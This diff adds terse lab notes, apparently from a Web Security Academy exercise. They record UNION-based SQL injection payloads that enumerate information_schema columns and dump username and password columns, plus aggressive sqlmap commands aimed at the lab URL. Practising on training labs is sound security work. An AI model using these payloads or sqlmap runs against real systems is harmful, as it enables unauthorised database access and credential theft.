@@ -1,0 +1,39 @@
+
+category=Gifts'
+
+
+
+SELECT * FROM products WHERE category = '--+' AND released = 1 
+
+
+
+users_vuwlag --> TABLE
+
+FIND COLOUMS -->  
+
+'UNION SELECT column_name,'aa' FROM information_schema.columns WHERE  table_name = 'users_vuwlag' --+
+
+COLUM : password_dphxmz, username_kpklmc
+
+
+'UNION SELECT username_kpklmc,password_dphxmz FROM 'users_vuwlag'--+
+
+
+
+users_vuwlag
+
+ ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='users_vuwlag' --+
+
+ username_kpklmc,password_dphxmz
+
+ UNION SELECT username_kpklmc,password_dphxmz FROM users_vuwlag --+
+
+ 
+ 
+ sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=*" --level=5 --risk=3 --keep-alive --fresh-queries --random-agent --batch --banner --dbs 
+
+
+ sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=*" --level=5 --risk=3 --keep-alive --fresh-queries --random-agent --batch --banner -D information_schema.tables --tables
+
+
+sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=**" --random-agent --batch --dbs
